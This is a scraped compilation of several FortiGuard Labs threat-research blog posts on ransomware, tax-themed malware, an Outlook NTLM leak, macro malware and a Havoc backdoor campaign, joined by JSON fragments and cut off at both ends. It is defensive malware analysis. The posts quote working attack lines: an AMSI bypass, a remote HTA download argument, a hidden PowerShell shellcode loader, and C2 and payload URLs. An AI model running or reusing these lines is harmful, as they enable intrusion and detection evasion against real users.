Another pop-up window with the attacker’s email address is displayed upon clicking “Contact Us”. Victims are given four attempts to correctly enter a decryption key that is supposedly provided after the ransom is paid. The decryption screen warns that the encrypted files will be lost after four attempts. Based on traits found in the recent Kadavro Vector ransomware, we were able to trace it back to an older variant (SHA2: b7ca2dde7789da13d1b8729cc2ef3d5dc596cbd710a06c17ff6eb4ef2d9d1182) from early 2023, which may be the initial variant that calls itself “Kadavro”. The older Kadavro Vector variant encrypts files (including itself) on compromised machines, just like in recent samples. This older variant appends a “.tor” extension instead of the “.vector_” extension used by current variants. b7ca2dde7789da13d1b8729cc2ef3d5dc596cbd710a06c17ff6eb4ef2d9d1182 also replaces the desktop wallpaper. While we did not observe the Kadavro ransomware dropping a ransom note in our testing, it is visible in its code. The ransom note references “Anon Vector”, which is likely another ransomware that the threat actor previously used or at least tried to use. We also discovered another ransomware called “Kadavro” (SHA2: b30ef4dbcc89cd4bf0da3e7787f43e42023ddc2b5f0bb4f24937538e10e17533) that was submitted to a public submission portal a week earlier. Since both Kadavro samples were submitted from the U.S. and Russia, and the submission dates are close, the same threat actor may be involved. The ransom note dropped by b30ef4dbcc89cd4bf0da3e7787f43e42023ddc2b5f0bb4f24937538e10e17533 is available only in English and demands $160 worth of Monero from victims for file decryption. Furthermore, one of the recent Kadavro Vector samples refers to a Pastebin page for a ngrok address. \"ngrok” is a legitimate easy-to-usereverse proxy toolthat allows developers to expose local services to the internet. Unfortunately, threat actors often abuse ngrok’s tunneling capabilities for Command-and-Control (C2) communication. Based on the Pastebin page address, we found other malware potentially used by the same threat actor. Some of the samples are XWorm, a Remote Access Trojan (RAT) with ransomware capabilities. This may indicate that the Kadavro Vector ransomware threat actor tried other malware that supports file encryption. The Kadavro Vector ransomware variants described in this report are detected and blocked by FortiGuard Antivirus as: Other malware potentially used by the same threat actor are detected with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are protected. File-based IOCs: Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware today is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected.

    "content": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Windows usersImpact:Compromised machines are under the control of the threat actor, potentially resulting in stolen personally identifiable information (PII), credential theft, financial loss, etc.Severity Level:Medium The time has come again for tax returns—and tax-based scams. Targeting calendar-based events enables threat actors to prepare ahead of time and have a new selection of targets on rotation. This blog covers a few examples of malware that take advantage of tax season. Although such attacks may seem repetitive to the casual observer, threat actors would not continue to target taxpayers if previous attacks had not been successful. FortiGuard Labs became aware of a curious-looking archive file hosted on an open directory on www[.]farmaciasmv[.]com/citrix/2022%20tax_documents[.]zip, which has since been removed. The zip file contains the following files: The XLSX file is a benign decoy file that contains financial data from an unknown source. The other file is malicious. Despite Robert tax_docs.pdf having a PDF icon, it is different from what it seems. The file is actually a link (LNK) file that launches the legitimate script (C:\\Windows\\System32\\SyncAppvPublishingServer.vbs), which has a known issue of taking command line arguments. The link file exploits this issue and feeds the legitimate script with the following command line argument to download and execute a remote “note.hta”: ;\\W_\\*2\\\\\\m_h_a_e ('http'+'://datacenter002[.]myftp[.]biz/documents/note.'+'hta') The downloaded note.hta uses PowerShell to download another remote file hosted on hxxp://datacenter002[.]myftp[.]biz/documents/note[.]gif, which was not available at the time of our investigation. Finding another note.gif (SHA2: 0487ef401345aa17c6aaeac23151219863e1363f82fe76edd0066bbf3fb07715) based on the same infection chain let us continue our quest to the payload. note.gif is a PowerShell script that creates the following files: Once launched, it executes the onedrive.vbs and test.vbs files. test.vbs creates %usertemp%\\Note.txt, a clean file containing fake \"QUARTERLY TAX PAYMENTS FOR 2022\" data. onedrive.vbs runs the previously created onedrive.ps1 filled with activities designed to hamper Windows Defender. It first executes the following known AMSI (Antimalware Scripting Interface) bypass: [Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’) .GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true) It also disables AMSI by hijacking the COM server, changing it from \"%windir%\\system32\\amsi.dll\" to \"C:\\IDontExist.dll\". The PowerShell script then performs the following actions to alter Windows Defender settings: The PowerShell script finally uses reflective loading to load a binary into memory that injects XWorm RAT version 3.1. Furthermore, we discovered other files that follow a similar attack pattern; “Mary tax docs.pdf.lnk” (SHA2: 6dee21d581eac2214e3ea7259bf9cb3e0cc31b442a372ffba00f82aa858050f0) and “Wilson tax_docs.pdf.lnk” (SHA2: c06cf72149d52b8a7c73b38c075156df4c458f633c3031c3c0ce32741ad1518e) that were used in March 2023. As with the attack mentioned previously, these link files are disguised as PDF files to fool potential victims into opening them. “Mary tax docs.pdf.lnk”, along with another clean Microsoft Office file, “R&P Sales Summary.docx”, are included in an archived file labeled “2022 tax docs.zip”. Running the link file triggers the download and execution of “doc.pdf” from “hxxp://datacenter11[.]myftp[.]org/notepad/”. The “doc.pdf” is actually a VBA file that uses PowerShell to pull and run “hxxp://datacenter11[.]myftp[.]org/met/a[.]mp3”. While the “a.mp3” is not available for investigation, OSINT (Open Source Intelligence) indicates that the XWorm malware is likely delivered to the victim’s machine. From the evidence that FortiGuard Labs accumulated during our research, we have high confidence that the 2022%20tax_documents[.]zip file we initially analyzed delivers the XWorm. XWorm is a commodity RAT (Remote Access Trojan) reportedly sold in underground forums for $30 to $150. XWorm supports typical RAT functions, such as taking screenshots, keylogging, and taking control of a compromised machine by abusing Virtual Network Computing (VNC), a technique infamously known as Hidden VNC (HVNC). XWorm can also encrypt files, essentially acting in a similar fashion to ransomware. Here are screenshots of a recently cracked version of XWorm v3.1: Going back to the first example, “2022%20tax_documents[.]zip”, we found that it was hosted on the open directory “www[.]farmaciasmv[.]com/citrix/”. We also found another page on the same domain likely used for phishing hxxp://farmaciasmv[.]com/sharefile/citrix/2022%20taxes[.]html. The files involved in this attack were submitted to VirusTotal. We don’t believe victims just wander into such malicious sites by accident. Based on our experience, they were likely lured via malicious links in spam emails. Manual interactions are required up until the files inside the zip file are extracted, and the link file is manually run. The basic security practice of not opening files from unknown sources can prevent infection and the damages that follow. Another tax-related attack FortiGuard Labs came across is an image file named “TaxReturn2022.img” (SHA2: 6658d4b14f0093a2fccd2f57b5bf9fa18d09cda5d42036f280b41e5beb1ff2fe) that contains the following files: We were able to locate another file, “TaxReturns2022.iso” (SHA2: bb7138a106ee2e0a384896316679c750e3287b51fc16a5e65ccd1e44911162d6), that contains identical files. Unfortunately, the infection vector for both files has not been identified, but the likely attack avenue is an email containing malicious attachments and links. The TaxReturns2022.zip file within both archives is password-protected with an unknown password, and its contents cannot be extracted. As with the previous example, “TaxReturn2022.pdf.lnk” has a PDF icon. However, it’s a link (shortcut) file, as seen in Figure 4.  Manually executing the lnk file triggers the download of wed.hta from hxxp://179.43.175[.]187/pqpf/ and saves it as %USERAPPDATA%\\wed.hta (SHA2: 0cbaf95b9d4df27442d753dc4cb600eda0a7ecb95e4071f380f69f5f3c89adb1). The downloaded file is an HTA web file containing VBScript code for the next action and a lot of junk code. It eventually runs: powershell.exe -ExecutionPolicy UnRestricted [powershell code This PowerShell code is designed to execute whatever was downloaded. In this case, it downloads “TaxReturn2022.pdf” from hxxp://179.43.175[.]187/pqpf/, saves it as %USERAPPDATA%\\TaxReturn2022.pdf, and opens it. Unfortunately, this PDF file is a clean decoy file that also requires an unidentified password to open. The PowerShell code sets the following registry entry to open the downloaded PDF file every time the computer boots and adds the HIDDEN file attribute to the file: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\iXqrVo = [location of downloaded PDF file] This behavior led us to believe that the threat actor behind this attack relies on templates and uses them without really knowing what they are because there is no valid reason to open a decoy PDF file at every startup, and adding the HIDDEN file attribute is usually reserved for executables and DLLs. The script then sleeps five seconds before downloading and executing whatever has been downloaded. In this case, it downloads TCywxTOvZk.wsf from hxxp://[redacted].67[.]12:222/ and saves it as %USERAPPDATA%\\TCywxTOvZk.wsf (SHA2: 351b0514feaa6a2fc21af25ad7c6c9bed93e38ef896d3fb6c8633924d8615e2d). Note that part of the IP address masked as the directory is accessible. TCywxTOvZk.wsf has only three meaningful lines of code out of almost 2840 lines and downloads and runs hxxp://[redacted].67[.]12:222/no[.]txt (SHA2: d7c63c4d488918aa09fcbd2012d041ed440377af51a87e757c40df3725b1eb07). no.txt contains VBScript code that downloads and executes hxxp://[redacted].67[.]12:222/j[.]png (SHA2: 460d093a55b930e733c60575f82183cd0edd52ec6b927cdb4a93dc5da7f0ac9c), which is a PowerShell script that creates the following files: The script then runs Microsoft.bat, which uses MSHTA.exe to run PowerShell code to run py.ps1. The .ps1 file contains two PE files (stored in $apprun and $appme). It uses 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe' to reflectively load $apprun, which then loads $appme, which was identified as an ASync RAT variant that connects to the attacker’s Command-and-Control (C2) server located at nulled2nd[.]camdvr[.]org:6666. We also found another .lnk file (SHA2: c0a59b28919282b3c45a9619410ea95e35f86dbf43266e6f9a25b94f5948018b) hidden in TaxReturns2022.pdf.iso (SHA2: ee1299f4e56c7f5af243df63192f1c7574152c0600edc49c37b9f8b703da02f2). This link file goes through the same infection chain as the previous one: qDxcmqPPmI.wsf was not available at the time of the investigation. However, OSINT led us to find the next action. Curiously the attacker left the hosting location of the malicious files wide open. The directory contains a few files whose names are associated with Adobe Acrobat Reader DC. This indicates that the threat actor also leverages Adobe as a lure to install the AsyncRAT variant. AsyncRAT contains features designed to steal information from compromised machines and a clipper feature that monitors the clipboard for crypto wallet address swapping, which means victims may end up paying more than their taxes. But however potential victims end up with the “TaxReturn2022.img” and “TaxReturns2022.pdf.iso” files on their system, users still need to manually mount them and run the fake PDFs to trigger the infection chain. A little caution can go a long way toward protecting yourself against tax-related malware. The attacks covered in this blog are the tip of the iceberg. Attackers make every attempt to scam taxpayers for financial gain and data exfiltration for future attacks. In the end, those looking to save a dime, in this case, from Uncle Sam, often find that greed endangers them in the cyber world.

    "content": "FortiGuard Labs Threat Research FortiGuard Labsrecently investigated an Elevation of Privilege vulnerability in Microsoft Outlook that can be exploited by sending a crafted email to a vulnerable version of the software. When the victim receives the email, an attempt to connect to an attacker’s device is triggered, resulting in the victim’s NTLMv2 hash being leaked. The vulnerable property resides in the PidLidReminderFileParameter extended MAPI property, which specifies the filename of a sound to be played when a reminder for an object is overdue. To trigger the vulnerability, the sender simply modifies the PidLidReminderFileParameter message property to point to a malicious UNC path in a calendar or task item invite. To replicate this vulnerability, we used the Outlook AppointmentItem object to customize a malicious appointment email in the Calendar folder. No interaction from the recipient is required. Upon receipt of the email, an automatic reminder pop-up appears on the recipient’s device that triggers NTLM authentication behind the scenes. A request to access the UNC path via SMB to an untrusted network is initiated. To obtain the NTLMv2 hash of the recipient during authentication, a MitM (Man in the Middle) attack can be set up to concurrently listen to and poison incoming requests. Using NTLM authentication, a bad actor can then use the exposed hashes to elevate their privileges in other systems, potentially gaining control of services unbeknownst to the email recipient. Microsoft has released ascriptthat checks for the presence of the PidLidReminderFileParameter message property in Exchange messaging items. This script provides the option to sanitize or fully remove items containing the vulnerable parameter. Microsoft has also released anadvisoryfor CVE-2023-23397 outlining the latest security updates.

    "content": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Windows UsersImpact:Potential to deploy additional malware for additional purposesSeverity level:Medium In early February of 2022,Microsoft announcedthat Internet Macros would be blocked by default to improve the security of Microsoft Office.According to their blogpublished in late Feb 2023, this change began rolling out in some update channels in April 2022. Other channels followed in July and October 2022, with the final rollout in January 2023. Office uses a specific algorithm to determine whether to run macros in files from the Internet. The process starts by checking the file attribute. If it has a Mark of the Web (MOTW) attribute, it verifies whether it is from a trusted location and performs other processes, and based on those outcomes, it decides whether to block or run the macro. Since that announcement, we have observed that cyber threat actors have begun to test and adopt new infection vectors to replace Office macros. Several methods include using .hta, .lnk, and .chm files, targeting Office vulnerabilities (Equation Editor and Follina are the most common), and we have seen the use of xll files over the past year by cyber threat actors to distribute their malicious payloads. The most common method employed by several cybercrime and nation-state actors is using ISO image files that usually contain a .lnk file and a dll payload to distribute their malware. In this method, the victim must execute the .lnk file, which leads to executing the dll file – commonly either a malicious payload or a downloader that grabs the next-stage payload. These ISO images are either directly attached to a spam/phishing email or have been dropped using other methods, like html smuggling, in which an html file is attached to the spam/phishing email, and by opening it, a malicious ISO file is dropped in the victim’s machine. We covered these techniques in blogs last year,hereandhere. Even though several cyber threat actors have adopted TTPs to not use Office macros, we have observed several threat actors still relying on Office macros to initiate their attacks. In this blog post, we provide an overview of some of the interesting Office macro-embedded documents we observed early this year (some of these activities have already been reported on by security researchers on Twitter). It is worth mentioning that while some of the threat actors had multiple activities, we only cover one of them as an example in the post. But we added all the related IOCs in the IOC (Indicator of Compromise) section at the end of this blog. Emotet is a modular malware launched into the wild around 2014, operating as a banking malware in an organized botnet. But nowadays, Emotet mainly operates as a downloader for additional payloads such as IcedId, eventually deploying ransomware. Emotet has adopted .lnk files as one of its distribution methods, using this method in mid-2022. OnMarch 7of this year, Emotet is back in operation, and this time the actor is using malicious documents to spread Emotet. In this new campaign, malicious documents weaponized with macros are embedded in an archive file and used as attachments in spam emails. The lure they use is well-known, having been employed by these threat actors in their previous campaigns. This is not the only template used in this campaign. We also observed that the actor had used another template to distribute Emotet. All the URLs, strings, and file names are encoded in the macro. It also includes a decoder function to decode these strings. The decoder function receives three arguments: a hardcoded string, an array of numbers that are populated before calling the decoder function, and a size. The function has a loop with the provided size, and it uses a Mid function each time to find the proper character from the hardcoded string and append them together to build the string. The array of numbers shows which character needs to be selected. All function executions are performed by the CallByName function. This function executes a method of an object. The macro first decodes all the encoded URLs and then creates a file name to store the Emotet payload. The file name is also decoded, which is the machine's current time. For example, if the time is 12:25:23, the file name will be 122523.tmp. It then builds the required parameters for each URL and makes the HTTP request to get the Emotet payload. More specifically, it adds the current time (in the format used to create the .tmp file name) and a parameter to the end of the URL (usually, c=1). It performs the HTTP requests and checks on the status till it receives ‘200’, which means the server has responded. It then downloads the response body, which is a zip file, and saves it into the victim’s machine in the same location as the Word document is located. After that, it extracts the zip file and moves the contents of the archive file into that tmp file, whose name was created in the previous step. It then deletes both the zip file and the extracted directory. In the last step, it calls RegSvr32.exe to execute the payload. Gozi ISFB, also known as Ursnif, is a banking trojan that has been distributed through spam campaigns, exploit kits, and fake pages. Recently, this trojan has been distributed using various methods, such as .hta and .lnk files, but this trojan is also still being distributed using macro-based Excel documents. In a recent spam campaign onMarch 9th,they used archive files containing macro-embedded Excel files as attachments to spam emails to target users in Italy. The Excel document contains a macro that downloads and executes the Gozi payload. Enabling macros won’t activate the download execution since the primary function is executed when the end user clicks the “APRI (Open)” button. Clicking this button executes the “beneficiary” function. This function is simple. As you can see below, the download URL is encoded within the macro but has some numbers between each character. It then uses UrlDownloadToFileA to download the payload and save it into a .cvs file in the Document directory. It then uses the VBA.Shell function to execute the downloaded dll using rundll32. It also clears the cache of Internet Explorer using the Shell command. Donot APT, also known as APT-C-35 and SectorE02, is a threat actor targeting organizations and individuals in South Asia – specifically, Bangladesh, Sri Lanka, Pakistan, and Nepal – since at least 2016.  This actor relies on spear-phishing emails weaponized with malicious documents to target its victims. We have observed that the group still uses malicious documents to target its victims. We observed some maldocs being used by this actor in early 2023, and in this section, we will look at the most recent campaign run by this actor. Most of the maldocs we observed have a creation time of around 2021, but all were connected to domains created in the past 30 days. This suggests that the threat actor has reused maldocs previously made by them in their Feb and March 2023 campaign. The embedded macro uses a combination of lesser-known APIs to inject a shellcode inside the memory of the Microsoft Office: NtAllocateVitualMemory, WideCharToMulitBytes, and Internal_EnumUILanguages. The Internal_EnumUIlanguages API is used as a callback to execute the shellcode. These API calls bypass blacklist detections that detect known functions in VBA, such as Shell and Run functions. The injected shellcode connects to its C2s to get the next-stage payload. It also creates a scheduled task to make connections to its C2. Besides what we analyzed here, we have also seen a malicious Word document used by this actor sometime around Jan 17thof this year. Confucius is a threat actor primarily operating cyberespionage campaigns against Pakistan since 2013. This threat actor has used macro-based documents in its past campaigns and is still using the same method to initiate its current attacks. In one of their most recent operations, run in February of this year, they used macro-based documents to target the financial division of the government of Pakistan. The macro drops a text file into thePublic/Picturesdirectory and then creates a scheduled task service to execute the text file at a specific time. In fact, the dropped txt file is a shellcode that will be executed by calling PowerShell. powershell.EXE -w hidden iex([System.Text.Encoding]::ASCII).GetString((([string](get-content -path C:\\Users\\Public\\Pictures\\walpaper.jpeg.txt)).replace(' ','')).split(',')) SideCopy is a Pakistani threat actor primarily targeting India since at least 2019. The actor has used multiple methods. such as .lnk files, macro-based documents, and trojanized applications to initiate its attacks. In one of their most recent operations, they still used macro-embedded word documents to target the government of India. The macro is simple. Its execution starts when a user closes the document. It connects to its server to download the content of a payload in text format, which it then converts to an executable and stores in the Startup directory to be executed after a machine reboot. On March 1st, we identified a new malicious document that might have targeted Vietnamese users. The malicious document was weaponized with a macro, yet another example of threat actors that still rely on macro-embedded documents to initiate their attacks. The embedded macro drops an archive file that contains all the malicious files needed in this attack. The archive file contains batch scripts, PowerShell scripts, and dll files. In the next step, it moves its archive file into the APPDATA/Microsoft directory and unzips it. The dlls embedded within the archive file perform the primary malicious activities. The macro is only responsible for loading the right dll file according to the OS version and then calling its export function. The dll file is responsible for creating three scheduled tasks (Script_Update, Windows_Executor, Windows_Update) and executing them at specific time intervals. Each scheduled task executes one of the scripts embedded within the archive file. We also found another document associated with this actor that was uploaded to VirusTotal in December 2022. This may indicate that the actor has been active over the past few months. Besides what we have reported in the previous sections, we have also observed other actors still using macro-based documents to target their victims. Here are some of them: -    Kimsuky used a macro-based document to target Korean-speaking people. The maldoc deploys Quasar Rat. -      A threat actor targeted defense production factories in Pakistan in early February of this year. The actor used a macro-embedded Excel file to distribute its payload. Due to not having enough indicators, we are avoiding attributing this activity to any specific actor. The macro is not obfuscated. It just downloads the payload from the server and stores it in the Startup directory as Notepad.exe. This blog post provided an overview of threat actors still using macro-based Office documents. We showed several APT groups, such as Kimsuky, Donot, and SideCopy, and cyber-crime actors, such as Emotet, still relying on macro-based Office documents to initiate attacks and distribute their payloads. This research shows that although it has been over a year since Microsoft announced its intent to disable Internet macros, numerous threat actors still use those macros to distribute their malware. This suggests that security companies/people still need to be cautious about opening Office documents and update their software to the latest versions that block these macros by default.

    "link": "https://www.fortinet.com/blog/threat-research/malware-disguised-as-document-ukraine-energoatom-delivers-havoc-demon-backdoor",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Targeted Windows usersImpact:Compromised machines are under the control of the threat actorSeverity level:Medium As part of our ongoing research on malware being used in the Russian-Ukrainian conflict, FortiGuard Labs has encountered a malicious spoofed document pretending to be from the Ukrainian company, Energoatom, a state-owned enterprise that operates Ukraine’s nuclear power plants. Since the war with Russia began, Ukraine’s energy sector has been under constantcyberattack. For example, in April 2022, anattackdeploying INDUSTROYER2 and CADDYWIPER wiper malware targeted energy companies. On 16 August 2022, the Energoatom corporate website was the target of a DDoS attack. And in October 2022, yet another wiper attack, this one using the wiper dubbed NikoWiper, targeted the energy sector. Aside from highlighting the technical details of this latest multi-staged attack, which includes several evasion techniques, this article also discusses some strange artifacts that make us think this could be a work-in-progress or part of a red-team exercise. The macro-enabled document is named “zatverdzhenniy_spisok_osib_na_otrim”, which roughly translates to “approved list of persons to receive” in Ukrainian. It arrives inside an ISO image archive bearing the same filename. It was first submitted to VirusTotal in mid-March of this year. When opened, it displays an image instructing the user to enable Word’s macro code execution to reveal information supposedly protected by M.E. Doc (My Electronic Document). This popular Ukrainian document management system is used to exchange important and sensitive documents with organizations (including regulatory authorities) in electronic form. Blurred content with the logo for Energoatom is displayed behind the instruction, making it appear to be protecting important information (Figure 1). In reality, it’s just an ordinary image placed on the top layer of the document. Dragging it to the side reveals the supposedly protected information underneath. Once the macro is enabled, the image disappears, creating the impression that the critical information has somehow been revealed. The document contains an announcement about a list of people supposedly approved to receive protective equipment (Figure 2). To complicate analysis and attempt to evade detection, the macro’s VBA code employs a few interesting techniques. The Word application crashes when trying to view or debug the VBA code in the document. Similarly, when the document composition is analyzed usingoletools(a package of python tools used to analyze Microsoft OLE2 files), the tool produces several errors, including stream files that have been defined but are not present within the archive. The tool also reports an error about an incorrect signature when attempting to decompress a specific stream inside the file. We have not confirmed if either of these anomalies directly led to the crash above. Nevertheless, oletools eventually extracted the complete malicious VBA macro code intended to be executed by the document. In a likely attempt to make the location of the macro code less obvious, the VBA Project binary file that contains the actual VBA code is redirected to the file “EbDYTPZ.vEypm” instead of the default “vbaProject.bin”.  This association is detailed in “word\\_rels\\ document.xml.rels” of the Office Open XML archive with the following line: “<Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"EbDYTPZ.vEypm\"/>” As usual, the VBA code is set to execute when the document is opened via AutoOpen and Document_Open events. As mentioned, the macro begins by deleting the overlay image, which is internally a Shape object with the Name attribute “happy”. To find this image, it iterates through all the Shape objects in the document and deletes the one with the same name. To hide the strings it uses during its execution, it primarily uses a simple encoding by subtracting 35 from each character of the original string and encoding the result with Base64. In addition, it uses other operations, such as string reverse and character splitting, prior to decoding. As an anti-debugging technique, execution of the primary infection routine uses theApplication.OnTimefunction commonly used to schedule the execution of a specific VBA procedure instead of directly calling it. In this case, it schedules the immediate execution of the function “ostrategicy”. When debugging, this line of code produces theerror, “Can’t execute code in break mode”, and then stops executing. As seen in Figure 3, seemingly random nonsensical comments are also added to the VBA code. This malware then checks if a hardcoded path, “C:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll”, exists in the system. As discussed later, this is the same file path where the payload would be written. This strange implementation detail makes us think this may be a work in progress and could be a test sample created for a threat campaign that will soon be launched. The file at the abovementioned path is executed if it exists. Otherwise, the code extracts the payload that is cleverly stored as a node named “TwXfx” in a custom XML part of the document. Custom XML partsis a feature that was introduced with Office Open XML format. It is used for storing arbitrary data that the document could programmatically access. To get to the payload data, it starts by enumerating all the custom XML part objects in the document and then checking if they have a node named “TwXfx”. That node contains the encoded payload. Below is a screenshot of the encoded payload stored in “customXml\\item1.xml” of the document archive (Figure 4). Although the payload in this document is stored in a single node, the VBA code also supports an encoded payload split across several nodes, further complicating its extraction. In fact, before assuming that the data is stored in a single node, it first checks to determine whether it is stored in several nodes. It does this by trying to find the node name, in this case, “TwXfx”, with an appended index, i.e., “TwXfx_0”. If the node exists, it moves on to find the next one by incrementing the index (i.e., TwXfx_1). It repeats this until it fails to find a node, which means it has reached the end of the payload. Once a node is found, the content of the node is read, and its XML tags are removed. Furthermore, if a string “__b_” is found at the beginning of the data, it is also removed. Similar to decoding strings, the binary payload is extracted by decoding the data using Base64 and adding 35. Only this time, the resulting bytes are further decoded with xor 82. The decoded payload is a 64-bit executable (.exe). The storage of a payload binary as a custom XML part of the document is a technique very similar to what’s presented inthis blogfrom the website mgeeky.tech. Even on the code level, there are striking similarities between the code used by the malicious document and what’s presented in that blog. The website author offers a private tool that provides similar capabilities. Still, the creator of this malicious document could have easily replicated the technique from the publicly available PoC linked in the blog. Figure 5 shows one of the several code similarities observed in the function for locating the payload node in the document. Once the payload is decoded, it is written to the hardcoded path “C:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll” and executed usingShellExecutewith the following command line: C:\\Windows\\System32\\conhost.exe --headless \"C:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll\" \"” This eventually leads to the execution of a Havoc Demon agent, as discussed in the next section. Based on the filename of the payload binary, it tries to masquerade as a legitimate component of Microsoft Office. It is even signed with an invalid portal.office.com certificate (Figure 6). While this file has a DLL extension and contains multiple exports (Figure 7), it is a standalone EXE file. Upon execution, it locates a packed and compressed payload in the.vdatasection (Figure 8) of the memory allocated for the current process. The payload storage is structured as follows: 1.     Offset 0x0: Magic (8 bytes) 2.     Offset 0x8: Encrypted flag (0 = not encrypted, 3 = RC4 encryption) 3.     Offset 0x9: Compression flag (0 = not compressed, 3 = LZNT1 compression) 4.     Offset 0xa: RC4 key (64 bytes) 5.     0ffset 0x4a: Compressed size (4 bytes) 6.     Offset 0x4e: Uncompressed size (4 bytes) 7.     Offset 0x52: Loader configuration string length (2 bytes) 8.     Offset 0x154: Start of encrypted and compressed loader configuration and payload After decrypting and decompressing the payload, we see a pipe-delimited configuration followed by the actual shellcode to be executed (Figure 9). The loader configuration format is as follows: After parsing the configuration, this loader prepends a stub containing 79 bytes of junk instructions before the actual payload shellcode. The bytes at 25 hardcoded offsets within this stub are replaced with random bytes to hinder shellcode detection. It first ensures that a file within the %TEMP% does not exist before attempting to launch the payload. The name of this file is derived from a value computed from hour / 3 + year + month + day of the current time. Hence, the payload will only be executed up to 8 times per day. To launch the shellcode, the loader callsZwCreateThreadExto create a new suspended injection thread hidden from debuggers using theTHREAD_CREATE_FLAGS_CREATE_SUSPENDED(0x01) andTHREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER(0x4) thread creation flags. By removing theTHREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGERflag before theZwCreateThreadExcall and using memory breakpoints, the shellcode can be debugged in the usual manner when the thread resumes execution. While not enabled in this sample, the loader also supports sleep obfuscation to hinder detection by memory scanners. It does this by redirecting calls to the Windows Sleep API to its own function that performs the following: 1.     Suspends all threads in the current process 2.     Reverts the patched Sleep API code bytes 3.     Reverts patches to security APIs (only if patching was configured) 4.     Encodes sensitive memory regions in the current process with a randomized XOR key 5.     Calls Sleep with the specified timeout 6.     Decodes sensitive memory regions in the current process with the same XOR key 7.     Patches security-related APIs to disable them 8.     Patches Sleep to redirect to this function again 9.     Resumes all threads in the current process The patched APIs are: Interestingly, well-known Cobalt Strike configuration field names (Figure 10) are also found in plaintext within the sample, possibly to confuse static analysis tools. The second stage consists of a shellcode with a Havoc C2 agent DLL appended to it. Havoc C2 framework is an open-source post-exploitation toolkit developed by C5pider and comprises the following components: The shellcode looks for 0x4d 0x5a and 0x50 0x45 bytes that denote the “MZ\" and “PE” headers of a Windows PE executable file to locate the payload in memory. It then calls the loader (referred to internally as KaynLdr in thesource code) KaynLdr resolves theLdrLoadDll,ZwAllocateVirtualMemory,andNtProtectVirtualMemoryNative APIs via API hashing before using them to allocate memory, load the Demon agent payload, and execute it directly from memory. The relevant API hashes are: The DLL loaded by KaynLdr is the Havoc Demon agent, which is analogous to Beacon for the popular Cobalt Strike framework. The configuration is embedded within the Demon sample. Demon communicates with the C2 server specified in the configuration via HTTP or HTTPS POST requests. A randomized 256-bit key and 128-bit IV are generated and shared with the C2 server on the initial check-in request (Figure 11) for encrypting subsequent data communicated between the agent and C2 server with AES-256-CTR. The relevant fields in the check-in request are as follows: 1.     Size of data package 2.     Magic value: 0xDE 0xAD 0xBE 0xEF (hardcoded into Havoc) 3.     Agent ID 4.     Command ID: 0x63 (DEMON_INITIALIZE) 5.     32-byte AES key 6.     16-byte AES IV 7.     AES-encrypted data While Demon can be configured to rotate among multiple C2 domains, only one C2 domain, \"ukrtatnafta[.]org\", is specified for this sample. This domain is very similar to ukrtatnafta[.]com, owned by Ukrtatnafta, a Ukrainian oil refining company. To blend in with legitimate HTTP/HTTPS traffic, Demon randomly picks one of several URIs set in the configuration and applies a specified list of HTTP headers in the requests to the C2. The Teamserver C2 configuration extracted from this sample can be seen below. The major features of Demon include: As this Demon sample was unmodified from the version in Github, we will not analyze it in detail here. Interested readers may refer to thedocumentationandsource codeon GitHub. This malware campaign showcases some interesting techniques threat actors use to evade detection and hinder analysis. Using a combination of such techniques, threat actors may gain sufficient time to complete their post-exploitation commands upon successful infection before they are detected. Although the document contains some indicators of a potential red-team exercise, e.g., the hardcoded path for persisting the payload on disk and use of a relatively novel payload encoding technique, it is also entirely possible that this could be a campaign under development as many red-team tools have been weaponized recently for malicious purposes. As this document delivers a backdoor that will silently provide control over the infected user’s system to a remote operator with unknown intentions, it is safer to err on the side of caution and ensure protections are in place. The increasing use of open-source offensive security frameworks is a double-edged sword.  On the one hand, both red and blue teams can benefit from the availability of the source code to better understand how these techniques work, address detection gaps, and improve the cyber resilience of their organizations. On the other 